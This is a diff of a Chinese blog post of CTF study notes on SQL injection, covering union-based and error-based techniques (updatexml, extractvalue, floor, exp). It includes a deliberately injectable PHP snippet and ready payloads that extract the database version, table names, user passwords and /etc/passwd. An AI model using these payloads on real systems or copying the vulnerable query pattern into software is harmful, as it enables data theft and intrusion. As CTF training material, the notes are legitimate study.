@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="theme-color" content="#123456"><meta name="generator" content="Hexo 4.2.0"><title>ctf特训营笔记 - BeautyFlower</title><link rel="manifest" href="/manifest.json"><meta name="theme-color" content="#3273dc"><meta name="application-name" content="Icaurs - Hexo Theme"><meta name="msapplication-TileImage" content="icons/touch-icon-iphone.png"><meta name="msapplication-TileColor" content="#3273dc"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Icaurs - Hexo Theme"><meta name="apple-mobile-web-app-status-bar-style" content="default"><link rel="apple-touch-icon" sizes="144x144" href="icons/touch-icon-iphone.png"><link rel="apple-touch-icon" sizes="152x152" href="icons/touch-icon-ipad.png"><link rel="apple-touch-icon" sizes="72x72" href="icon/logo.ico"><link rel="apple-touch-icon" sizes="96x96" href="icon/logo.ico"><link rel="apple-touch-icon" sizes="128x128" href="icon/logo.ico"><link rel="apple-touch-icon" sizes="256x256" href="icon/logo.ico"><meta name="description" content="第一篇 CTF之Web第一章 常用工具安装及使用本章节就不记录了，主要有sqlmap burpsuite nmap 浏览器插件"><meta property="og:type" content="blog"><meta property="og:title" content="ctf特训营笔记"><meta property="og:url" content="http://example.com/post/392e8386.html"><meta property="og:site_name" content="BeautyFlower"><meta property="og:description" content="第一篇 CTF之Web第一章 常用工具安装及使用本章节就不记录了，主要有sqlmap burpsuite nmap 浏览器插件"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:published_time" content="2023-07-31T07:36:25.000Z"><meta property="article:modified_time" content="2024-09-28T16:17:20.000Z"><meta property="article:author" content="yyyyyyxnp"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://example.com/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/post/392e8386.html"},"headline":"ctf特训营笔记","image":["http://example.com/img/og_image.png"],"datePublished":"2023-07-31T07:36:25.000Z","dateModified":"2024-09-28T16:17:20.000Z","author":{"@type":"Person","name":"yyyyyyxnp"},"publisher":{"@type":"Organization","name":"BeautyFlower","logo":{"@type":"ImageObject","url":{"text":"BeautyFlower"}}},"description":"第一篇 CTF之Web第一章 常用工具安装及使用本章节就不记录了，主要有sqlmap burpsuite nmap 浏览器插件"}</script><link rel="canonical" href="http://example.com/post/392e8386.html"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="theme-color" content="#123456"><meta name="generator" content="Hexo 4.2.0"><title>ctf特训营笔记 - BeautyFlower</title><link rel="manifest" href="/manifest.json"><meta name="theme-color" content="#3273dc"><meta name="application-name" content="Icaurs - Hexo Theme"><meta name="msapplication-TileImage" content="icons/touch-icon-iphone.png"><meta name="msapplication-TileColor" content="#3273dc"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Icaurs - Hexo Theme"><meta name="apple-mobile-web-app-status-bar-style" content="default"><link rel="apple-touch-icon" sizes="144x144" href="icons/touch-icon-iphone.png"><link rel="apple-touch-icon" sizes="152x152" href="icons/touch-icon-ipad.png"><link rel="apple-touch-icon" sizes="72x72" href="icon/logo.ico"><link rel="apple-touch-icon" sizes="96x96" href="icon/logo.ico"><link rel="apple-touch-icon" sizes="128x128" href="icon/logo.ico"><link rel="apple-touch-icon" sizes="256x256" href="icon/logo.ico"><meta name="description" content="第一篇 CTF之Web 第一章 常用工具安装及使用 本章节就不记录了，主要有sqlmap burpsuite nmap 浏览器插件"><meta property="og:type" content="blog"><meta property="og:title" content="ctf特训营笔记"><meta property="og:url" content="http://example.com/post/392e8386.html"><meta property="og:site_name" content="BeautyFlower"><meta property="og:description" content="第一篇 CTF之Web 第一章 常用工具安装及使用 本章节就不记录了，主要有sqlmap burpsuite nmap 浏览器插件"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:published_time" content="2023-07-31T07:36:25.000Z"><meta property="article:modified_time" content="2024-09-28T16:17:20.000Z"><meta property="article:author" content="yyyyyyxnp"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://example.com/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/post/392e8386.html"},"headline":"ctf特训营笔记","image":["http://example.com/img/og_image.png"],"datePublished":"2023-07-31T07:36:25.000Z","dateModified":"2024-09-28T16:17:20.000Z","author":{"@type":"Person","name":"yyyyyyxnp"},"publisher":{"@type":"Organization","name":"BeautyFlower","logo":{"@type":"ImageObject","url":{"text":"BeautyFlower"}}},"description":"第一篇 CTF之Web\r 第一章 常用工具安装及使用\r 本章节就不记录了，主要有sqlmap burpsuite nmap 浏览器插件"}</script><link rel="canonical" href="http://example.com/post/392e8386.html"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
   (function () {
       function switchTab() {
           if (!location.hash) {
@@ -30,436 +30,534 @@
       window.addEventListener('hashchange', switchTab, false);
   })();
   </script><!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="BeautyFlower" type="application/atom+xml">
-</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">BeautyFlower</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/deng12yx"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-07-31T07:36:25.000Z" title="2023/7/31 15:36:25">2023-07-31</time></span><span class="level-item">Updated&nbsp;<time dateTime="2024-09-28T16:17:20.000Z" title="2024/9/29 00:17:20">2024-09-29</time></span><span class="level-item"><a class="link-muted" href="/categories/ctf/">ctf</a></span><span class="level-item">an hour read (About 12639 words)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>&nbsp;visits</span></div></div><h1 class="title is-3 is-size-4-mobile">ctf特训营笔记</h1><div class="content"><h2 id="第一篇-CTF之Web"><a href="#第一篇-CTF之Web" class="headerlink" title="第一篇 CTF之Web"></a>第一篇 CTF之Web</h2><h3 id="第一章-常用工具安装及使用"><a href="#第一章-常用工具安装及使用" class="headerlink" title="第一章 常用工具安装及使用"></a>第一章 常用工具安装及使用</h3><p>本章节就不记录了，主要有sqlmap burpsuite nmap 浏览器插件</p>
+</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">BeautyFlower</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/deng12yx"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-07-31T07:36:25.000Z" title="2023/7/31 15:36:25">2023-07-31</time></span><span class="level-item">Updated&nbsp;<time dateTime="2024-09-28T16:17:20.000Z" title="2024/9/29 00:17:20">2024-09-29</time></span><span class="level-item"><a class="link-muted" href="/categories/ctf/">ctf</a></span><span class="level-item">an hour read (About 12639 words)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>&nbsp;visits</span></div></div><h1 class="title is-3 is-size-4-mobile">ctf特训营笔记</h1><div class="content"><h2 id="第一篇-ctf之web">第一篇 CTF之Web</h2>
+<h3 id="第一章-常用工具安装及使用">第一章 常用工具安装及使用</h3>
+<p>本章节就不记录了，主要有sqlmap burpsuite nmap 浏览器插件</p>
 <span id="more"></span>
-
-<h2 id="第二章-SQL注入攻击"><a href="#第二章-SQL注入攻击" class="headerlink" title="第二章 SQL注入攻击"></a>第二章 SQL注入攻击</h2><h4 id="什么是sql注入"><a href="#什么是sql注入" class="headerlink" title="什么是sql注入"></a>什么是sql注入</h4><h5 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h5><ul>
-<li>可回显的注入<ul>
+<h2 id="第二章-sql注入攻击">第二章 SQL注入攻击</h2>
+<h4 id="什么是sql注入">什么是sql注入</h4>
+<h5 id="sql注入分类">sql注入分类</h5>
+<ul>
+<li>可回显的注入
+<ul>
 <li>联合查询</li>
 <li>报错注入</li>
 <li>通过注入进行DNS请求</li>
-</ul>
-</li>
-<li>不可回显的注入<ul>
+</ul></li>
+<li>不可回显的注入
+<ul>
 <li>Bool盲注</li>
 <li>时间盲注</li>
-</ul>
-</li>
+</ul></li>
 <li>二次注入（需要配合脚本）</li>
 </ul>
 <p>注意：通常出题人会增加一层WAF（比如：对关键字进行过滤）</p>
-<h4 id="可以联合查询的sql注入"><a href="#可以联合查询的sql注入" class="headerlink" title="可以联合查询的sql注入"></a>可以联合查询的sql注入</h4><p>看到了测试样例代码时需要关闭GPC，但是lz不知道GPC是什么，简单查了一下：</p>
+<h4 id="可以联合查询的sql注入">可以联合查询的sql注入</h4>
+<p>看到了测试样例代码时需要关闭GPC，但是lz不知道GPC是什么，简单查了一下：</p>
 <p>GPC是php.ini中的magic_quotes_gpc，默认为off，如何打开了，会实现addslashes()和stripslashes()的功能，对于从GET，POST，COOKIE输入的单引号、双引号、反斜线和NULL会加反斜线进行转义</p>
 <p>eg：</p>
 <p>代码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	<span class="variable">$getid</span>=<span class="string">&quot;select id from users where user_id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$getid</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="title function_ invoke__">mysql_error</span>().<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">	<span class="variable">$num</span>=<span class="title function_ invoke__">mysql_numrows</span>(<span class="variable">$result</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>如果此时传参?id&#x3D;-1’union+select+1+–+</p>
-<p>拼接后就变成select id from users where user_id&#x3D;’-1’ union select 1 – ‘</p>
-<p>–后面的’会被注释掉</p>
-<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h5><p>对于会返回报错信息的界面，该方法实用</p>
-<p>还是上面的例子：传参?id&#x3D;1’+updatexml(1,concat(0x7e,(select version()),0x7e),1)%23</p>
+<p>如果此时传参?id=-1'union+select+1+--+</p>
+<p>拼接后就变成select id from users where user_id='-1' union select 1 --
+'</p>
+<p>--后面的'会被注释掉</p>
+<h4 id="报错注入">报错注入</h4>
+<h5 id="updatexml">updatexml</h5>
+<p>对于会返回报错信息的界面，该方法实用</p>
+<p>还是上面的例子：传参?id=1'+updatexml(1,concat(0x7e,(select
+version()),0x7e),1)%23</p>
 <p>注入原理：</p>
 <p>updatexml是SQL语法的一个函数：<code>UPDATEXML(XML_document, XPath_string, new_value)</code></p>
 <p>参数：</p>
-<p>1： <code>XML_document</code>是String格式，为XML文档对象的名称，文中为Doc</p>
-<p>2：<code>XPath_string</code> (Xpath格式的字符串) ，用于匹配第一个参数中的部分内容。（就像使用正则表达式匹配一个文本的特定内容一样）</p>
-<p>3： <code>new_value</code>，String格式，替换查找到的符合条件的数据。</p>
+<p>1：
+<code>XML_document</code>是String格式，为XML文档对象的名称，文中为Doc</p>
+<p>2：<code>XPath_string</code> (Xpath格式的字符串)
+，用于匹配第一个参数中的部分内容。（就像使用正则表达式匹配一个文本的特定内容一样）</p>
+<p>3：
+<code>new_value</code>，String格式，替换查找到的符合条件的数据。</p>
 <p>在这里，我们利用updatexml函数的报错机制进行注入，原理就是当第二个参数的格式和Xpath的格式不符的时候，就会产生报错，我们可以将我们的payload构造到第二个参数中，让其随着报错信息展示到页面上。</p>
-<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h5><p><code>extractvalue(xml_frag, xpath_expr)</code>：从一个使用xpath语法的xml字符串中提取一个值。</p>
+<h5 id="extractvalue">extractvalue</h5>
+<p><code>extractvalue(xml_frag, xpath_expr)</code>：从一个使用xpath语法的xml字符串中提取一个值。</p>
 <p><code>xml_frag</code>：xml文档对象的名称，是一个string类型。</p>
 <p><code>xpath_expr</code>：使用xpath语法格式的路径。</p>
-<p>SQL报错注入的应用：当使用extractvalue(xml_frag, xpath_expr)函数时，若xpath_expr参数不符合xpath格式，就会报错。</p>
-<p>而<code>~</code>符号(ascii编码值：0x7e)是不存在xpath格式中的， 所以一旦在xpath_expr参数中使用<code>~</code>符号，就会产生xpath syntax error (xpath语法错误)，通过使用这个方法就可以达到报错注入的目的。</p>
+<p>SQL报错注入的应用：当使用extractvalue(xml_frag,
+xpath_expr)函数时，若xpath_expr参数不符合xpath格式，就会报错。</p>
+<p>而<code>~</code>符号(ascii编码值：0x7e)是不存在xpath格式中的，
+所以一旦在xpath_expr参数中使用<code>~</code>符号，就会产生xpath syntax
+error (xpath语法错误)，通过使用这个方法就可以达到报错注入的目的。</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and <span class="title function_">extractvalue</span>(<span class="number">1</span>, (<span class="title function_">concat</span>(<span class="number">0x7e</span>,(payload)))) #</span><br><span class="line">or  <span class="title function_">extractvalue</span>(<span class="number">1</span>,<span class="title function_">concat</span>(<span class="number">0x3a</span>,(select <span class="title function_">database</span>()),<span class="number">0x3a</span>)) #</span><br></pre></td></tr></table></figure>
-
-<h5 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h5><p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_27130557/article/details/120902212">Floor报错注入原理解析心得_floor注入-CSDN博客</a></p>
-<p>group by与rand()使用时，如果临时表中没有该主键，则在插入前rand()会再计算一次，但是由于是直接插入，所以可能最开始查找是否有该主键的时候确实没有，但是rand()之后可能产生一个存在的值，但是再次计算之后是直接插入，就有可能出现报错：主键重复，我们可以将我们想要的内容放在group by里，这样返回报错信息的时候会返回</p>
-<h6 id="爆破数据库版本："><a href="#爆破数据库版本：" class="headerlink" title="爆破数据库版本："></a>爆破数据库版本：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and(select 1 from (select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure>
-
+<h5 id="floor">floor</h5>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_27130557/article/details/120902212">Floor报错注入原理解析心得_floor注入-CSDN博客</a></p>
+<p>group
+by与rand()使用时，如果临时表中没有该主键，则在插入前rand()会再计算一次，但是由于是直接插入，所以可能最开始查找是否有该主键的时候确实没有，但是rand()之后可能产生一个存在的值，但是再次计算之后是直接插入，就有可能出现报错：主键重复，我们可以将我们想要的内容放在group
+by里，这样返回报错信息的时候会返回</p>
+<h6 id="爆破数据库版本">爆破数据库版本：</h6>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and(select 1 from (select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure>
 <p>使用<code>concat</code>函数将数据库版本信息（<code>version()</code>）连接到<code>0x7e</code>（波浪号）两边</p>
 <p>(select (select concat(0x7e,version(),0x7e)))：</p>
-<ol>
-<li>外层 <code>SELECT</code> 子查询：<code>(select ...)</code>，这是外层的子查询，它是整个注入语句的一部分。外层子查询的作用是将内层子查询的结果作为一个单独的列返回。</li>
-<li>内层 <code>SELECT</code> 子查询：<code>(select concat(0x7e,version(),0x7e))</code>，这是内层的子查询，也就是嵌套在外层查询中的子查询。它的作用是生成一个字符串，该字符串是数据库版本信息（<code>version()</code>）前后加上波浪号（<code>0x7e</code>）的结果。</li>
+<ol type="1">
+<li>外层 <code>SELECT</code>
+子查询：<code>(select ...)</code>，这是外层的子查询，它是整个注入语句的一部分。外层子查询的作用是将内层子查询的结果作为一个单独的列返回。</li>
+<li>内层 <code>SELECT</code>
+子查询：<code>(select concat(0x7e,version(),0x7e))</code>，这是内层的子查询，也就是嵌套在外层查询中的子查询。它的作用是生成一个字符串，该字符串是数据库版本信息（<code>version()</code>）前后加上波浪号（<code>0x7e</code>）的结果。</li>
 </ol>
-<p>整个 SQL 注入语句的目的是通过嵌套的子查询来生成一个包含数据库版本信息的字符串，并将这个字符串作为一个列（column）返回给外层的查询。在嵌套的子查询中，使用了 <code>concat</code> 函数来连接字符串，得到的结果类似于 <code>~version~</code>，其中 <code>~</code> 是波浪号的表示。由于这个查询是恶意的，并且尝试利用 SQL 注入漏洞来执行非法操作，它使用了嵌套子查询的方式，通过外层子查询来返回内层子查询的结果，从而构造出恶意的SQL语句。这样做的目的是为了绕过应用程序的安全检测，执行恶意的数据库查询。</p>
-<h6 id="爆破当前用户"><a href="#爆破当前用户" class="headerlink" title="爆破当前用户"></a>爆破当前用户</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and(select 1 from (select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="爆破当前使用的数据库"><a href="#爆破当前使用的数据库" class="headerlink" title="爆破当前使用的数据库"></a>爆破当前使用的数据库</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and(select 1 from (select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span></span><br></pre></td></tr></table></figure>
-
+<p>整个 SQL
+注入语句的目的是通过嵌套的子查询来生成一个包含数据库版本信息的字符串，并将这个字符串作为一个列（column）返回给外层的查询。在嵌套的子查询中，使用了
+<code>concat</code> 函数来连接字符串，得到的结果类似于
+<code>~version~</code>，其中 <code>~</code>
+是波浪号的表示。由于这个查询是恶意的，并且尝试利用 SQL
+注入漏洞来执行非法操作，它使用了嵌套子查询的方式，通过外层子查询来返回内层子查询的结果，从而构造出恶意的SQL语句。这样做的目的是为了绕过应用程序的安全检测，执行恶意的数据库查询。</p>
+<h6 id="爆破当前用户">爆破当前用户</h6>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and(select 1 from (select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span></span><br></pre></td></tr></table></figure>
+<h6 id="爆破当前使用的数据库">爆破当前使用的数据库</h6>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and(select 1 from (select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span></span><br></pre></td></tr></table></figure>
 <p><code>a</code> 是一个子查询的别名</p>
-<h6 id="爆破指定表的字段"><a href="#爆破指定表的字段" class="headerlink" title="爆破指定表的字段"></a>爆破指定表的字段</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and(select 1 from (select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p>当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误</p>
+<h6 id="爆破指定表的字段">爆破指定表的字段</h6>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and(select 1 from (select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span></span><br></pre></td></tr></table></figure>
+<h5 id="exp">exp</h5>
+<p>当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误</p>
 <p>可以用 <code>~</code> 运算符按位取反的方式得到一个最大值</p>
-<p>除了 exp() 之外，还有类似 pow() 之类的相似函数同样是可利用的，他们的原理相同。</p>
-<h6 id="爆破表名"><a href="#爆破表名" class="headerlink" title="爆破表名"></a>爆破表名</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())x));</span><br></pre></td></tr></table></figure>
-
-<h6 id="爆破列名"><a href="#爆破列名" class="headerlink" title="爆破列名"></a>爆破列名</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)x));</span><br></pre></td></tr></table></figure>
-
-<h6 id="爆破数据"><a href="#爆破数据" class="headerlink" title="爆破数据"></a>爆破数据</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span> (<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> group_concat(id, <span class="number">0x7c</span>, username, <span class="number">0x7c</span>, password) <span class="keyword">from</span> users)x));</span><br></pre></td></tr></table></figure>
-
-<h6 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>))x));</span><br></pre></td></tr></table></figure>
-
-<h4 id="BOOL盲注"><a href="#BOOL盲注" class="headerlink" title="BOOL盲注"></a>BOOL盲注</h4><p>应用界面仅仅返回True（页面）或者False（页面）。无法根据应用程序的返回页面得到需要的数据库信息。可以通过构造逻辑判断（比较大小）来得到需要的信息。</p>
+<p>除了 exp() 之外，还有类似 pow()
+之类的相似函数同样是可利用的，他们的原理相同。</p>
+<h6 id="爆破表名">爆破表名</h6>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())x));</span><br></pre></td></tr></table></figure>
+<h6 id="爆破列名">爆破列名</h6>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)x));</span><br></pre></td></tr></table></figure>
+<h6 id="爆破数据">爆破数据</h6>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span> (<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> group_concat(id, <span class="number">0x7c</span>, username, <span class="number">0x7c</span>, password) <span class="keyword">from</span> users)x));</span><br></pre></td></tr></table></figure>
+<h6 id="读取文件">读取文件</h6>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>))x));</span><br></pre></td></tr></table></figure>
+<h4 id="bool盲注">BOOL盲注</h4>
